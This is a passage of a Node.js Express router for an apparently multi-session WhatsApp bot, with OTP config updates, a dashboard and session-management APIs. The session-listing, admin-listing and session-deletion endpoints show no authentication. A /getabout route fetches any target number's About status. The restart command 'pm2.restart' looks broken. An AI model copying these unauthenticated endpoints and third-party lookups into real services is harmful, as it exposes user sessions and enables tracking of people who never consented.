  catch (error) { otpStore.delete(sanitizedNumber); res.status(500).send({ error: 'Failed to send OTP' }); }
});


router.get('/verify-otp', async (req, res) => {
  const { number, otp } = req.query;
  if (!number || !otp) return res.status(400).send({ error: 'Number and OTP are required' });
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const storedData = otpStore.get(sanitizedNumber);
  if (!storedData) return res.status(400).send({ error: 'No OTP request found for this number' });
  if (Date.now() >= storedData.expiry) { otpStore.delete(sanitizedNumber); return res.status(400).send({ error: 'OTP has expired' }); }
  if (storedData.otp !== otp) return res.status(400).send({ error: 'Invalid OTP' });
  try {
    await setUserConfigInMongo(sanitizedNumber, storedData.newConfig);
    otpStore.delete(sanitizedNumber);
    const sock = activeSockets.get(sanitizedNumber);
    if (sock) await sock.sendMessage(jidNormalizedUser(sock.user.id), { image: { url: config.RCD_IMAGE_PATH }, caption: formatMessage('📌 CONFIG UPDATED', 'Your configuration has been successfully updated!', BOT_NAME_FANCY) });
    res.status(200).send({ status: 'success', message: 'Config updated successfully' });
  } catch (error) { console.error('Failed to update config:', error); res.status(500).send({ error: 'Failed to update config' }); }
});


router.get('/getabout', async (req, res) => {
  const { number, target } = req.query;
  if (!number || !target) return res.status(400).send({ error: 'Number and target number are required' });
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const socket = activeSockets.get(sanitizedNumber);
  if (!socket) return res.status(404).send({ error: 'No active session found for this number' });
  const targetJid = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
  try {
    const statusData = await socket.fetchStatus(targetJid);
    const aboutStatus = statusData.status || 'No status available';
    const setAt = statusData.setAt ? moment(statusData.setAt).tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss') : 'Unknown';
    res.status(200).send({ status: 'success', number: target, about: aboutStatus, setAt: setAt });
  } catch (error) { console.error(`Failed to fetch status for ${target}:`, error); res.status(500).send({ status: 'error', message: `Failed to fetch About status for ${target}.` }); }
});


// ---------------- Dashboard endpoints & static ----------------

const dashboardStaticDir = path.join(__dirname, 'dashboard_static');
if (!fs.existsSync(dashboardStaticDir)) fs.ensureDirSync(dashboardStaticDir);
router.use('/dashboard/static', express.static(dashboardStaticDir));
router.get('/dashboard', async (req, res) => {
  res.sendFile(path.join(dashboardStaticDir, 'index.html'));
});


// API: sessions & active & delete

router.get('/api/sessions', async (req, res) => {
  try {
    await initMongo();
    const docs = await sessionsCol.find({}, { projection: { number: 1, updatedAt: 1 } }).sort({ updatedAt: -1 }).toArray();
    res.json({ ok: true, sessions: docs });
  } catch (err) {
    console.error('API /api/sessions error', err);
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


router.get('/api/active', async (req, res) => {
  try {
    const keys = Array.from(activeSockets.keys());
    res.json({ ok: true, active: keys, count: keys.length });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


router.post('/api/session/delete', async (req, res) => {
  try {
    const { number } = req.body;
    if (!number) return res.status(400).json({ ok: false, error: 'number required' });
    const sanitized = ('' + number).replace(/[^0-9]/g, '');
    const running = activeSockets.get(sanitized);
    if (running) {
      try { if (typeof running.logout === 'function') await running.logout().catch(()=>{}); } catch(e){}
      try { running.ws?.close(); } catch(e){}
      activeSockets.delete(sanitized);
      socketCreationTime.delete(sanitized);
    }
    await removeSessionFromMongo(sanitized);
    await removeNumberFromMongo(sanitized);
    try { const sessTmp = path.join(os.tmpdir(), `session_${sanitized}`); if (fs.existsSync(sessTmp)) fs.removeSync(sessTmp); } catch(e){}
    res.json({ ok: true, message: `Session ${sanitized} removed` });
  } catch (err) {
    console.error('API /api/session/delete error', err);
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


router.get('/api/newsletters', async (req, res) => {
  try {
    const list = await listNewslettersFromMongo();
    res.json({ ok: true, list });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message || err });
  }
});
router.get('/api/admins', async (req, res) => {
  try {
    const list = await loadAdminsFromMongo();
    res.json({ ok: true, list });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


// ---------------- cleanup + process events ----------------

process.on('exit', () => {
  activeSockets.forEach((socket, number) => {
    try { socket.ws.close(); } catch (e) {}
    activeSockets.delete(number);
    socketCreationTime.delete(number);
    try { fs.removeSync(path.join(os.tmpdir(), `session_${number}`)); } catch(e){}
  });
});


process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
  try { exec(`pm2.restart ${process.env.PM2_NAME || 'YOU-WEB-BOT'}`); } catch(e) { console.error('Failed to restart pm2:', e); }
});


// initialize mongo & auto-reconnect attempt

initMongo().catch(err => console.warn('Mongo init failed at startup', err));
(async()=>{ try { const nums = await getAllNumbersFromMongo(); if (nums && nums.length) { for (const n of nums) { if (!activeSockets.has(n)) { const mockRes = { headersSent:false, send:()=>{}, status:()=>mockRes }; await EmpirePair(n, mockRes); await delay(500); } } } } catch(e){} })();

module.exports = router;
